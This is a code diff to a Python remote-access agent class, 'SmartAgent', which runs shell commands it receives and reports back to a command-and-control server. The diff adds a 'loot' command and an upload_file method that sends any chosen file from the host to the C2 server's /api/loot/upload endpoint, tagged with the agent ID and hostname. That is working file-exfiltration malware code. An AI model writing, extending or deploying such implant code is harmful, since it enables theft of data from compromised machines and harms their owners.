@@ -1,4 +1,4 @@
-mport requests
+import requests
 import time
 import subprocess
 import platform
@@ -107,6 +107,9 @@ class SmartAgent:
             except Exception as e:
                 return str(e)
         
+        if command.lower().startswith('loot '):
+            return self.upload_file(command.strip().split(maxsplit=1)[1])
+
         try:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             stdout, stderr = proc.communicate(timeout=30)
@@ -116,6 +119,31 @@ class SmartAgent:
             return "Command timed out."
         except Exception as e:
             return f"Error executing command: {e}"
+
+    def upload_file(self, file_path):
+        """Uploads a specified file to the C2 server."""
+        if not os.path.exists(file_path) or not os.path.isfile(file_path):
+            return f"Error: File not found or is not a file: {file_path}"
+        
+        try:
+            upload_url = f"{self.c2_url}/api/loot/upload"
+            with open(file_path, 'rb') as f:
+                payload = {
+                    'agentId': self.agent_id,
+                    'hostname': self.hostname,
+                    'type': 'File Loot',
+                    'original_path': os.path.abspath(file_path)
+                }
+                files = {'lootFile': (os.path.basename(file_path), f)}
+                
+                response = requests.post(upload_url, data=payload, files=files, timeout=60)
+                
+                if response.status_code == 200:
+                    return f"Successfully looted and uploaded {file_path}"
+                else:
+                    return f"Failed to upload file. Server responded with {response.status_code}"
+        except Exception as e:
+            return f"An exception occurred during file upload: {e}"
 
     def handle_special_commands(self, command):
         """Check for and handle mode-switching commands."""
